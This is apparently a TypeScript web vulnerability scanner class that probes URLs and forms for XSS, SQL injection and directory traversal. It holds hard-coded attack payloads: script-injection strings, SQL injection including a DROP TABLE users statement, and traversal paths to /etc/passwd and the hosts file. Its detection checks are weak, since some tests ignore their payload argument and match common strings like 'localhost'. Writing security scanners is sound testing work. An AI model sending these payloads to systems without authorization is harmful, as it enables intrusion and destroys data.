import fetch from 'node-fetch';

export class VulnerabilityDetector {
  
  async testXSSVulnerability(url: string, payload: string): Promise<boolean> {
    try {
      const response = await fetch(url, {
        method: 'GET',
        headers: {
          'User-Agent': 'Mozilla/5.0 (compatible; Xploitra-Scanner/1.0)',
        },
        timeout: 10000,
      });

      if (!response.ok) return false;

      const html = await response.text();
      
      // Check if payload is reflected in response without encoding
      const encodedPayload = this.htmlEncode(payload);
      return html.includes(payload) && !html.includes(encodedPayload);
    } catch (error) {
      return false;
    }
  }

  async testSQLIVulnerability(url: string, payload: string): Promise<boolean> {
    try {
      const response = await fetch(url, {
        method: 'GET',
        headers: {
          'User-Agent': 'Mozilla/5.0 (compatible; Xploitra-Scanner/1.0)',
        },
        timeout: 10000,
      });

      if (!response.ok) return false;

      const html = await response.text();
      const lowerHtml = html.toLowerCase();
      
      // Check for SQL error messages
      const sqlErrors = [
        'sql syntax',
        'mysql_fetch',
        'ora-01756',
        'microsoft ole db',
        'odbc drivers error',
        'sqlite_error',
        'postgresql query failed',
        'warning: pg_',
        'valid mysql result',
        'mysql server version for the right syntax'
      ];

      return sqlErrors.some(error => lowerHtml.includes(error));
    } catch (error) {
      return false;
    }
  }

  async testDirectoryTraversalVulnerability(url: string, payload: string): Promise<boolean> {
    try {
      const response = await fetch(url, {
        method: 'GET',
        headers: {
          'User-Agent': 'Mozilla/5.0 (compatible; Xploitra-Scanner/1.0)',
        },
        timeout: 10000,
      });

      if (!response.ok) return false;

      const html = await response.text();
      
      // Check for common system file signatures
      const signatures = [
        'root:x:0:0:',  // /etc/passwd
        '[boot loader]', // Windows boot.ini
        '127.0.0.1',    // hosts file
        'localhost',    // hosts file
      ];

      return signatures.some(sig => html.includes(sig));
    } catch (error) {
      return false;
    }
  }

  async testFormXSSVulnerability(action: string, method: string, inputName: string, payload: string): Promise<boolean> {
    try {
      const formData = new URLSearchParams();
      formData.append(inputName, payload);

      const requestOptions: any = {
        method: method.toUpperCase(),
        headers: {
          'User-Agent': 'Mozilla/5.0 (compatible; Xploitra-Scanner/1.0)',
          'Content-Type': 'application/x-www-form-urlencoded',
        },
        timeout: 10000,
      };

      if (method.toUpperCase() === 'POST') {
        requestOptions.body = formData;
      } else {
        action += '?' + formData.toString();
      }

      const response = await fetch(action, requestOptions);
      
      if (!response.ok) return false;

      const html = await response.text();
      const encodedPayload = this.htmlEncode(payload);
      
      return html.includes(payload) && !html.includes(encodedPayload);
    } catch (error) {
      return false;
    }
  }

  async testFormSQLIVulnerability(action: string, method: string, inputName: string, payload: string): Promise<boolean> {
    try {
      const formData = new URLSearchParams();
      formData.append(inputName, payload);

      const requestOptions: any = {
        method: method.toUpperCase(),
        headers: {
          'User-Agent': 'Mozilla/5.0 (compatible; Xploitra-Scanner/1.0)',
          'Content-Type': 'application/x-www-form-urlencoded',
        },
        timeout: 10000,
      };

      if (method.toUpperCase() === 'POST') {
        requestOptions.body = formData;
      } else {
        action += '?' + formData.toString();
      }

      const response = await fetch(action, requestOptions);
      
      if (!response.ok) return false;

      const html = await response.text();
      const lowerHtml = html.toLowerCase();
      
      const sqlErrors = [
        'sql syntax',
        'mysql_fetch',
        'ora-01756',
        'microsoft ole db',
        'odbc drivers error',
        'sqlite_error',
        'postgresql query failed',
        'warning: pg_',
        'valid mysql result'
      ];

      return sqlErrors.some(error => lowerHtml.includes(error));
    } catch (error) {
      return false;
    }
  }

  getBasicXSSPayloads(): string[] {
    return [
      '<script>alert("XSS")</script>',
      '"><script>alert("XSS")</script>',
      'javascript:alert("XSS")',
      '<img src=x onerror=alert("XSS")>',
      '<svg onload=alert("XSS")>'
    ];
  }

  getBasicSQLIPayloads(): string[] {
    return [
      "' OR '1'='1",
      "' UNION SELECT 1,2,3--",
      "'; DROP TABLE users; --",
      "' OR 1=1 LIMIT 1 --",
      "1' AND (SELECT COUNT(*) FROM information_schema.tables)>0 AND '1'='1"
    ];
  }

  getBasicDirectoryTraversalPayloads(): string[] {
    return [
      "../../../etc/passwd",
      "..\\..\\..\\windows\\system32\\drivers\\etc\\hosts",
      "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
    ];
  }

  private htmlEncode(str: string): string {
    return str
      .replace(/&/g, '&amp;')
      .replace(/</g, '&lt;')
      .replace(/>/g, '&gt;')
      .replace(/"/g, '&quot;')
      .replace(/'/g, '&#x27;');
  }
}
